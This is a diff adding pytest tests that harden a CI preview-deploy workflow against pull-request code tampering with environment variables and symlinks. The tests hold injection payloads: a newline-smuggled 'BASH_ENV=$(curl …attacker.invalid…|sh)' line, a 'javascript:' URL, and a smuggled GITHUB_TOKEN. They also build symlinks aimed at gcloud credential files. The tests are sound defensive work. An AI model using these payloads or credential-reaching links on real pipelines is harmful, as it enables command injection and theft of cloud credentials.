@@ -423,3 +423,46 @@ def test_a_pull_request_that_conflicts_with_main_gets_no_preview_and_a_notice(tm
     assert code == 0 and output == '' and '::warning::' in log and "had not worked out the merge" in log
     code, log, output, _ = run_head_job(tmp_path, [['', 'null', '']], {})
     assert code == 1 and '::error::' in log
+
+
+# --- what a preview's code can change is data (issue #133, the review of PR #169) ---
+
+def test_an_origin_a_preview_rewrote_never_reaches_github_env():
+    """A preview runs a pull request's code as the build's and the runtime's service accounts; if either can update the
+    service, it can put anything in the template's PUBLIC_DEMO_ORIGIN. A newline there used to become a line of its
+    own in $GITHUB_ENV (BASH_ENV=$(curl …|sh) runs in every later step, the deploy after auth included)."""
+    for value in (f'{LEGACY}\nBASH_ENV=$(curl -s https://attacker.invalid/p|sh)', f'{LEGACY},https://x.run.app|PUBLIC_DEMO_LIVE_MODEL=0',
+                  'javascript:alert(1)', f'{LEGACY},https://x.run.app/path'):
+        proc = subprocess.run([sys.executable, '-I', str(SCRIPT), 'origins', 'pr-41'], input=json.dumps(service_json(env_origins=value)),
+                              capture_output=True, text=True)
+        assert proc.returncode == 1 and proc.stdout == '', (value, proc.stdout)
+        assert proc.stderr.startswith('::error::BASE_ORIGINS would carry ') and '\n' not in proc.stderr.rstrip('\n'), proc.stderr
+    svc = service_json(traffic=[{'percent': 100, 'latestRevision': True},
+                                {'tag': 'pr-41', 'url': 'https://pr-41---x.run.app\nGITHUB_TOKEN=x', 'revisionName': 'r'}])
+    proc = subprocess.run([sys.executable, '-I', str(SCRIPT), 'url', 'pr-41'], input=json.dumps(svc), capture_output=True, text=True)
+    assert proc.returncode == 1 and proc.stdout == '' and '::error::PREVIEW_URL' in proc.stderr
+    custom = 'https://shift.talktomymachine.ai'   # production's allow-list as the main deploy writes it still passes
+    proc = subprocess.run([sys.executable, '-I', str(SCRIPT), 'origins', 'pr-41'], input=json.dumps(service_json(env_origins=f'{LEGACY},{custom}')),
+                          capture_output=True, text=True, check=True)
+    assert proc.stdout.splitlines()[0] == f'BASE_ORIGINS={LEGACY},{custom}'
+
+
+def test_a_symlink_out_of_the_pull_requests_tree_fails_before_the_upload(tmp_path):
+    """gcloud's source archive stores a symlinked file's contents (zipfile.write follows it), so a link from pr/ to a
+    runner file, gcloud's own stored credential once the auth step has run, would carry it to Cloud Build."""
+    tree = tmp_path / 'pr'
+    (tree / 'src').mkdir(parents=True)
+    (tree / '.git').mkdir()
+    (tree / 'src' / 'a.py').write_text('x = 1\n')
+    os.symlink('a.py', tree / 'src' / 'b.py')                   # inside: fine
+    os.symlink('src', tree / 'docs')                            # inside: fine
+    os.symlink('/home/runner/.config/gcloud', tree / '.git' / 'x')   # in .git, which gcloud never uploads (.gcloudignore)
+    run = lambda: subprocess.run([sys.executable, '-I', str(SCRIPT), 'links', str(tree)], capture_output=True, text=True)
+    assert run().returncode == 0 and run().stdout == ''
+    os.symlink('/home/runner/.config/gcloud/credentials.db', tree / 'creds')            # absolute, and missing until auth
+    os.symlink('../../gha-creds-x.json', tree / 'src' / 'c.json')                       # up out of the tree
+    os.symlink('docs/../../outside', tree / 'chain')                                     # through a link inside
+    proc = run()
+    assert proc.returncode == 1, proc.stdout
+    named = sorted(line.split("'")[1] for line in proc.stdout.splitlines())
+    assert named == ['chain', 'creds', 'src/c.json'] and all(l.startswith('::error::') for l in proc.stdout.splitlines())
